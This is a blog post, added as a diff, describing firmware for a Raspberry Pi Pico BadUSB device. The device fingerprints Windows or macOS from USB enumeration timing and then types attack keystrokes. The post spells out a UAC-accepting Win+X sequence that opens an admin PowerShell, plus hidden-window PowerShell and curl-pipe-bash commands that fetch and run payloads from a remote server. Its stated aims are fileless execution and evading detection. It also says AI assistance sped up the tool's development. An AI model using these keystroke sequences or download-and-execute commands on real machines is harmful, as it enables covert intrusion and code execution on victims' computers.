@@ -1,0 +1,160 @@
+---
+title: "Passive OS Detection for BadUSB with AI-Assisted Firmware Development"
+date: "2026-02-06"
+excerpt: "Building a Raspberry Pi Pico HID device that passively fingerprints Windows vs macOS via USB enumeration behavior, with AI as a development accelerator."
+tags: ["BadUSB", "USB", "HID", "Raspberry Pi Pico", "OS Detection", "Firmware", "AI-Assisted Development"]
+---
+
+# Passive OS Detection for BadUSB with AI-Assisted Firmware Development
+
+## Introduction
+
+AI assistance was used during firmware development as a productivity multiplier — primarily to accelerate troubleshooting firmware, reason about protocols, and shorten iteration cycles. The underlying techniques are based on documented USB and HID behavior and were manually designed and validated. The broader takeaway is displacement. This shift affects defenders and attackers equally, raising the baseline of what should be assumed possible from less practiced threat actors.
+
+This project is a Raspberry Pi Pico-based HID device that passively detects Windows vs macOS via USB enumeration behavior, then executes OS-specific payloads pulled from a remote server. The firmware is written in C using the Pico SDK and TinyUSB library.
+
+## The Goal
+
+The objective was to build a Raspberry Pi Pico-based USB device that could:
+
+1. **Passively detect the host OS** — fingerprint Windows vs macOS without sending custom requests that might raise suspicion
+2. **Obtain elevated access on Windows** — use keystroke sequences to bypass UAC and get an admin PowerShell session
+3. **Execute payloads filelessly** — pull scripts from a remote server and run them in memory, leaving minimal forensic traces
+4. **Operate as pure HID** — appear only as a keyboard, avoiding storage device exposure that might trigger additional security controls
+
+All of this was accomplished with the assistance of AI to accelerate firmware development, protocol reasoning, and troubleshooting.
+
+## How It Works
+
+The detection relies on USB enumeration fingerprinting — different operating systems have distinct behaviors when a HID device connects.
+
+**USB Enumeration Fingerprinting:**
+- **Configuration descriptor requests**: Windows typically sends 4+ requests during enumeration, macOS/Linux send fewer
+- **HID LED sync reports**: Windows and Linux send LED status updates (Num Lock, Caps Lock, Scroll Lock) within ~100ms of enumeration
+- **macOS never sends LED reports** - this is the key differentiator
+- The Pico monitors both signals during a time-windowed state machine
+
+**Detection Flow:**
+- **ENUM_WAIT phase (0-500ms)**: Count config requests, watch for LED reports
+- **Early decision**: If LED report arrives + high config count → Windows
+- **LED_WAIT phase (500ms-3s)**: If no LED report yet, keep waiting
+- **Timeout decision**: No LED report after 3s → macOS
+
+**Visual feedback:**
+- Fast blinking during detection
+- 1 blink = macOS detected
+- 2 blinks = Windows detected
+
+**Note:** The timing constants (500ms enum window, 3s LED timeout) aren't tuned for speed yet — these are just working numbers that function correctly but could potentially be optimized to be faster.
+
+## The Implementation
+
+The firmware is organized into three main components:
+
+**Project Structure:**
+```
+firmware/
+├── include/
+│   ├── osdetect.h          # OS detection API
+│   └── tusb_config.h       # TinyUSB configuration
+└── src/
+    ├── main.c              # Main loop, script execution
+    ├── osdetect.c          # Detection state machine
+    └── usb_descriptors.c   # HID device descriptors
+```
+
+**Key Components:**
+
+1. **Detection State Machine** (`osdetect.c`):
+   - States: `DETECT_IDLE` → `DETECT_ENUM_WAIT` → `DETECT_LED_WAIT` → `DETECT_DONE`
+   - Hooks: `osdetect_on_mount()`, `osdetect_on_config_request()`, `osdetect_on_led_report()`
+   - Detection constants:
+     ```c
+     #define ENUM_WINDOW_US      500000   // 500ms
+     #define LED_WINDOW_US      3000000   // 3s
+     #define SETTLE_WINDOW_US    250000   // 250ms post-LED
+     #define CONFIG_HIGH_THRESH        4  // Min config requests for Windows
+     ```
+
+2. **Main Loop** (`main.c`):
+   - Initializes TinyUSB and detection system
+   - Polls `osdetect_task()` to run state machine
+   - Launches payload script when OS is detected
+   - Handles USB mount/unmount callbacks
+
+3. **USB Callbacks**:
+   - `tud_mount_cb()`: Triggers `osdetect_on_mount()` when device connects
+   - `tud_hid_set_report_cb()`: Captures LED sync reports and passes to `osdetect_on_led_report()`
+
+4. **Payload Scripts**:
+   - Defined as step arrays with timing, modifiers, keycodes, and text
+   - Separate sequences for Windows and macOS
+
+## Payload Execution
+
+**Windows Payload (Elevated PowerShell):**
+
+The Windows sequence exploits the `Win+X` quick access menu to obtain elevated privileges:
+
+1. **Wait 1000ms** - let the desktop settle after USB enumeration
+2. **Win+X** - open Windows quick access menu
+3. **A** - select "Windows PowerShell (Admin)" (wait 2000ms for UAC prompt)
+4. **Alt+Y** - accept UAC prompt (wait 1500ms for PowerShell to open)
+5. **Type command**: `powershell -ep bypass -w hidden -c "irm https://trustmebro.helloto.me/windows_payload.ps1|iex"`
+6. **Enter** - execute
+
+This bypasses UAC by using the built-in Windows admin menu rather than trying to elevate an existing session.
+
+**macOS Payload (Terminal):**
+
+The macOS sequence uses Spotlight to launch Terminal:
+
+1. **Wait 500ms** - let the desktop settle
+2. **Cmd+Space** - open Spotlight search
+3. **Type**: `term` (no wait - Spotlight shows results instantly)
+4. **Wait 1000ms** - let Spotlight populate results
+5. **Enter** - launch Terminal.app (wait 1500ms for Terminal to open)
+6. **Type command**: `curl -s https://trustmebro.helloto.me/mac_payload.sh|bash`
+7. **Enter** - execute
+
+Both payloads pull scripts from a remote server and execute them in memory, leaving minimal forensic traces on disk.
+
+**Configuration:**
+
+The payload URL is defined in `main.c`:
+```c
+#define PAYLOAD_URL "https://trustmebro.helloto.me"
+```
+
+The server must host two files: `windows_payload.ps1` and `mac_payload.sh`.
+
+## The Result
+
+The final firmware successfully accomplishes all design goals:
+
+- **Passive OS detection works reliably** - distinguishes Windows from macOS within 500ms-3s of connection without active probing
+- **Elevated Windows access** - UAC bypass via `Win+X → A → Alt+Y` consistently obtains admin PowerShell
+- **Fileless execution** - payloads are pulled from remote server and executed in memory via `irm|iex` (Windows) and `curl|bash` (macOS)
+- **Pure HID operation** - device presents only as a keyboard, avoiding storage-related security controls
+- **Visual feedback** - LED blink patterns provide confirmation of detected OS
+
+**Build artifacts:**
+- Firmware binary: `build/firmware/pico_hid_osdetect.uf2`
+- Flash method: Hold BOOTSEL button, plug in Pico, copy UF2 to mounted drive
+
+**Development approach:**
+The project demonstrates how AI assistance can accelerate embedded systems development by helping with protocol reasoning, debugging USB enumeration timing issues, and iterating on state machine logic. The core fingerprinting technique leverages documented USB/HID behavior that varies predictably across operating systems.
+
+## Conclusion
+
+This project shows that passive OS detection via USB enumeration is both practical and reliable for BadUSB applications. The combination of configuration request counting and LED report timing provides a robust fingerprinting method that works without active probing.
+
+The use of AI as a development accelerator is notable — it compressed what would have been weeks of protocol debugging and firmware iteration into a much shorter timeline. This capability shift has implications for both offensive and defensive security: the barrier to entry for developing sophisticated hardware implants has lowered significantly.
+
+**Key takeaways:**
+- USB enumeration behavior provides reliable OS fingerprints
+- Timing constants can likely be optimized further for faster detection
+- AI assistance is a force multiplier for embedded firmware development
+- Defenders should assume this level of sophistication is now accessible to less experienced threat actors
+
+**Disclaimer:** This project is for authorized security testing and educational purposes only.
